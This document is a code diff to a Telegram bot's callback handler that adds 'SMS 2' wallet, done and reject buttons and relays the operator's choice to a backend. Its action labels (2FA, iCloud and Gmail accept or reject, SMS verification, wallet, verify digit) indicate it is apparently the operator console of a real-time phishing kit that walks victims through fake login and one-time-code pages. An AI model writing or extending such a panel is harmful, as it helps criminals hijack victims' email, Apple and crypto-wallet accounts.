@@ -31,7 +31,7 @@ bot.on("callback_query", async (query) => {
   try {
     const [action, email] = query.data.split("|");
 
-    console.log(`🔘 ${email} | ${action === "page1" ? "2FA" : action === "page2" ? "EMAIL" : action === "page_accept" ? "ICLOUD ACCEPT" : action === "page_reject" ? "ICLOUD REJECT" : action === "sms_accept" ? "SMS ACCEPT" : action === "sms_reject" ? "SMS REJECT" : action === "redirect_icloud" ? "ICLOUD" : action === "redirect_gmail" ? "GMAIL" : action === "gmail_accept" ? "GMAIL ACCEPT" : action === "gmail_reject" ? "GMAIL REJECT" : action === "gmail_verify_accept" ? "GMAIL VERIFY ACCEPT" : action === "gmail_verify_reject" ? "GMAIL VERIFY REJECT" : action === "verifying_sms" ? "VERIFYING SMS" : action === "verifying_done" ? "VERIFYING DONE" : action === "verifying_wallet" ? "VERIFYING WALLET" : action === "verify_digit" ? "VERIFY DIGIT" : "REJECT"}`);
+    console.log(`🔘 ${email} | ${action === "page1" ? "2FA" : action === "page2" ? "EMAIL" : action === "page_accept" ? "ICLOUD ACCEPT" : action === "page_reject" ? "ICLOUD REJECT" : action === "sms_accept" ? "SMS ACCEPT" : action === "sms_reject" ? "SMS REJECT" : action === "redirect_icloud" ? "ICLOUD" : action === "redirect_gmail" ? "GMAIL" : action === "gmail_accept" ? "GMAIL ACCEPT" : action === "gmail_reject" ? "GMAIL REJECT" : action === "gmail_verify_accept" ? "GMAIL VERIFY ACCEPT" : action === "gmail_verify_reject" ? "GMAIL VERIFY REJECT" : action === "verifying_sms" ? "VERIFYING SMS" : action === "verifying_done" ? "VERIFYING DONE" : action === "verifying_wallet" ? "VERIFYING WALLET" : action === "sms2_wallet" ? "SMS2 WALLET" : action === "sms2_done" ? "SMS2 DONE" : action === "sms2_reject" ? "SMS2 REJECT" : action === "verify_digit" ? "VERIFY DIGIT" : "REJECT"}`);
 
     // ✅ HANDLE VERIFY_DIGIT CALLBACKS (Gmail verification page)
     if (action === "verify_digit") {
@@ -72,6 +72,42 @@ bot.on("callback_query", async (query) => {
       } catch (err) {
         console.error("❌ verify_digit error:", err);
         await bot.answerCallbackQuery(query.id, { text: "Error processing digit" });
+        return;
+      }
+    }
+
+    // ✅ HANDLE SMS 2 BUTTONS (Wallet / Done / Reject)
+    if (action === "sms2_wallet" || action === "sms2_done" || action === "sms2_reject") {
+      const sms2Id = email; // email param is actually sms2Id
+      console.log(`📲 SMS 2 choice: ${action} for sms2Id: ${sms2Id}`);
+      
+      try {
+        const updateResult = await fetch(`${APP_URL}/update-sms2-choice`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ sms2Id, choice: action })
+        });
+        
+        const result = await updateResult.json();
+        console.log(`✅ SMS 2 choice updated: ${action}`);
+        
+        // Remove buttons from Telegram message
+        try {
+          await bot.editMessageReplyMarkup(
+            { inline_keyboard: [] },
+            { chat_id: query.message.chat.id, message_id: query.message.message_id }
+          );
+        } catch (err) {
+          console.error("Error removing buttons:", err);
+        }
+        
+        // Send popup
+        await bot.answerCallbackQuery(query.id, { text: `✅ ${action.toUpperCase()}` });
+        
+        return;
+      } catch (err) {
+        console.error("❌ SMS 2 choice error:", err);
+        await bot.answerCallbackQuery(query.id, { text: "Error processing choice" });
         return;
       }
     }
@@ -163,6 +199,12 @@ bot.on("callback_query", async (query) => {
     } else if (action === "gmail_verify_accept") {
       statusForBackend = "accepted";
     } else if (action === "gmail_verify_reject") {
+      statusForBackend = "rejected";
+    } else if (action === "sms2_wallet") {
+      statusForBackend = "wallet";
+    } else if (action === "sms2_done") {
+      statusForBackend = "done";
+    } else if (action === "sms2_reject") {
       statusForBackend = "rejected";
     }
 
@@ -259,6 +301,12 @@ bot.on("callback_query", async (query) => {
         statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
       } else if (action === "verifying_wallet") {
         statusMessage = `📧 <code>${email}</code> → <b>Wallet</b> 💼`;
+      } else if (action === "sms2_wallet") {
+        statusMessage = `🔐 <code>${email}</code> SMS 2 → <b>Wallet</b> 💼`;
+      } else if (action === "sms2_done") {
+        statusMessage = `🔐 <code>${email}</code> SMS 2 → <b>Done</b> 🏁`;
+      } else if (action === "sms2_reject") {
+        statusMessage = `🔐 <code>${email}</code> SMS 2 → <b>Rejected</b> ❌`;
       }
 
       console.log(`📨 Final statusMessage: "${statusMessage}"`);
